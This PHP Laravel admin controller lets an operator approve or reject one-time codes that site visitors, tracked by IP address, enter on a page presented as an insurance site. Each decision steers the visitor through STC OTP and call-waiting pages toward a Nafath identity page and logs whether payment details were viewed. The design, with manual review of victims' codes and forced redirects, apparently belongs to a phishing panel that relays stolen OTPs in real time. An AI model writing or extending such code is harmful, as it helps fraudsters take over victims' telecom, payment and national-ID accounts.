<?php

namespace App\Http\Controllers\Admin;

use App\Events\StcWaitingApproved;
use App\Events\StcWaitingRejected;
use App\Events\StcOtpApproved;
use App\Events\StcOtpRejected;
use App\Events\StcCallApproved;
use App\Events\StcCallRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\AdminOtpActionRequest;
use App\Http\Requests\Admin\AdminOtpRejectRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;

class AdminStcController extends Controller
{
    use NotifiesDashboard;

    /**
     * Merge an STC flag into the customer's extra_data and update current_page.
     */
    private function setStcFlag(string $customerIp, string $flag, string $currentPage, ?string $reason = null): void
    {
        $customer = CustomerProfile::where('ip_address', $customerIp)->first();
        if ($customer) {
            $extra = $customer->extra_data ?? [];
            $extra[$flag] = true;
            if ($reason !== null) {
                $extra[$flag . '_reason'] = $reason;
            }
            $customer->update(['current_page' => $currentPage, 'extra_data' => $extra]);
        }
    }

    // ─── Stage 1: STC Waiting ────────────────────────────────────

    /**
     * Approve STC waiting — redirect customer to STC OTP page
     */
    public function approveWaiting(AdminOtpActionRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            if (in_array($otp->status, ['approved', 'verified'])) {
                try {
                    broadcast(new StcWaitingApproved($request->customer_ip))->toOthers();
                } catch (\Throwable $e) {
                    \Log::warning('Broadcast failed (re-broadcast approveStcWaiting): ' . $e->getMessage());
                }
                $this->setStcFlag($request->customer_ip, 'stc_waiting_approved', '/insurance/stc/otp');
                $this->flushCustomerCache();
                $this->notifyDashboard($request->customer_ip, 'stc_waiting_approved');
                $this->refreshPaymentViewed($request->customer_ip);
                return response()->json([
                    'success' => true,
                    'message' => 'تمت إعادة إرسال الموافقة على انتظار STC',
                ]);
            }
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast(new StcWaitingApproved($request->customer_ip))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (approveStcWaiting): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_waiting_approved', '/insurance/stc/otp');
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_waiting_approved');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة - تم توجيه العميل إلى صفحة رمز التحقق STC',
        ]);
    }

    /**
     * Reject STC waiting
     */
    public function rejectWaiting(AdminOtpRejectRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast(new StcWaitingRejected($request->customer_ip, $request->input('reason')))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (rejectStcWaiting): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_waiting_rejected', '/insurance/phone-verification', $request->input('reason'));
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_waiting_rejected');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض طلب التحقق STC',
        ]);
    }

    // ─── Stage 2: STC OTP ────────────────────────────────────────

    /**
     * Approve STC OTP — redirect customer to STC call waiting page
     */
    public function approveOtp(AdminOtpActionRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        // If already approved/verified, re-broadcast the event (handles retry after wrong-path approval)
        if ($otp->status !== 'pending') {
            if (in_array($otp->status, ['approved', 'verified'])) {
                try {
                    broadcast(new StcOtpApproved($request->customer_ip))->toOthers();
                } catch (\Throwable $e) {
                    \Log::warning('Broadcast failed (re-broadcast approveStcOtp): ' . $e->getMessage());
                }
                $this->setStcFlag($request->customer_ip, 'stc_otp_approved', '/insurance/stc/call-waiting');
                $this->flushCustomerCache();
                $this->notifyDashboard($request->customer_ip, 'stc_otp_approved');
                $this->refreshPaymentViewed($request->customer_ip);
                return response()->json([
                    'success' => true,
                    'message' => 'تمت إعادة إرسال الموافقة على رمز التحقق STC',
                ]);
            }
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast(new StcOtpApproved($request->customer_ip))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (approveStcOtp): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_otp_approved', '/insurance/stc/call-waiting');
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_otp_approved');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على رمز التحقق STC - تم توجيه العميل لانتظار المكالمة',
        ]);
    }

    /**
     * Reject STC OTP
     */
    public function rejectOtp(AdminOtpRejectRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast(new StcOtpRejected($request->customer_ip, $request->input('reason')))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (rejectStcOtp): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_otp_rejected', '/insurance/phone-verification', $request->input('reason'));
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_otp_rejected');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض رمز التحقق STC',
        ]);
    }

    // ─── Stage 3: STC Call ───────────────────────────────────────

    /**
     * Approve STC call — redirect customer to next flow step
     */
    public function approveCall(AdminOtpActionRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            if (in_array($otp->status, ['approved', 'verified'])) {
                try {
                    broadcast(new StcCallApproved($request->customer_ip, '/insurance/nafath'))->toOthers();
                } catch (\Throwable $e) {
                    \Log::warning('Broadcast failed (re-broadcast approveStcCall): ' . $e->getMessage());
                }
                $this->setStcFlag($request->customer_ip, 'stc_call_approved', '/insurance/nafath');
                $this->flushCustomerCache();
                $this->notifyDashboard($request->customer_ip, 'stc_call_approved');
                $this->refreshPaymentViewed($request->customer_ip);
                return response()->json([
                    'success' => true,
                    'message' => 'تمت إعادة إرسال الموافقة على مكالمة STC',
                ]);
            }
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast(new StcCallApproved($request->customer_ip, '/insurance/nafath'))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (approveStcCall): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_call_approved', '/insurance/nafath');
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_call_approved');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على مكالمة STC - تم توجيه العميل إلى صفحة النفاذ',
        ]);
    }

    /**
     * Reject STC call
     */
    public function rejectCall(AdminOtpRejectRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast(new StcCallRejected($request->customer_ip, $request->input('reason')))->toOthers();
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (rejectStcCall): ' . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, 'stc_call_rejected', '/insurance/phone-verification', $request->input('reason'));
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, 'stc_call_rejected');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض مكالمة التحقق STC',
        ]);
    }
}
